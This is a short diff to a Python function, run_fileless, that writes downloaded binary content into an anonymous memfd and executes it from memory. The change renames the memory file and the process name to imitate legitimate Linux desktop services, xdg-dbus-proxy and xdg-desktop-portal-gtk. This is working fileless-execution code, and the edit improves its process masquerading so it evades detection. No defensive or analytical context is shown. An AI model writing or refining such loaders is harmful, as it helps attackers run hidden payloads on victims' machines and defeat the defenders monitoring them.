@@ -22,7 +22,7 @@ def run_fileless():
             binary_content = response.read()
     except Exception as e:
         return
-    fd = memfd_create(b"elf", 1)
+    fd = memfd_create(b"/usr/bin/xdg-dbus-proxy", 1)
     if fd == -1:
         return
     os.write(fd, binary_content)
@@ -35,7 +35,7 @@ def run_fileless():
         os._exit(0)
     try:
         fd_path = f"/proc/self/fd/{fd}"
-        os.execl(fd_path, "/usr/lib/systemd/systemd --user")
+        os.execl(fd_path, "/usr/libexec/xdg-desktop-portal-gtk")
     except OSError as e:
         print(f"[!] Failed to execute from memory: {e}")
         os._exit(1)
